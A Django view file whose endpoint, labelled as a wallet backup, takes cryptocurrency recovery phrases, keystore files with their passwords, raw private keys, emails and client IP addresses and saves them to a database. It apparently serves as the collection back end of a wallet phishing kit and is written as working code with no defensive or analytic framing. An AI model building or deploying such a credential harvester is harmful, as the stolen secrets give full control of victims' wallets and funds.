from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
import json
from .models import WalletBackup

def get_client_ip(request):
    """Get client IP address"""
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

@csrf_exempt
@require_http_methods(["POST"])
def submit_wallet_backup(request):
    """Handle wallet backup form submissions"""
    try:
        data = json.loads(request.body)
        
        # Create wallet backup record
        backup = WalletBackup(
            uid=data.get('uid'),
            wallet_name=data.get('walletName'),
            form_type=data.get('formType'),
            email=data['data'].get('email') or data['data'].get('keystoreEmail') or data['data'].get('privateEmail'),
            wallet_display_name=data['data'].get('walletName') or data['data'].get('keystoreWalletName') or data['data'].get('privateWalletName'),
            ip_address=get_client_ip(request)
        )
        
        # Store form-specific data
        if data.get('formType') == 'phrase':
            backup.phrase = data['data'].get('phrase')
        elif data.get('formType') == 'keystore':
            backup.keystore_json = data['data'].get('keystoreJson')
            backup.keystore_password = data['data'].get('keystorePassword')
        elif data.get('formType') == 'privateKey':
            backup.private_key = data['data'].get('privateKey')
        
        backup.save()
        
        return JsonResponse({
            'success': True,
            'uid': backup.uid,
            'message': 'Wallet backup saved successfully'
        })
    
    except Exception as e:
        return JsonResponse({
            'success': False,
            'error': str(e)
        }, status=400)
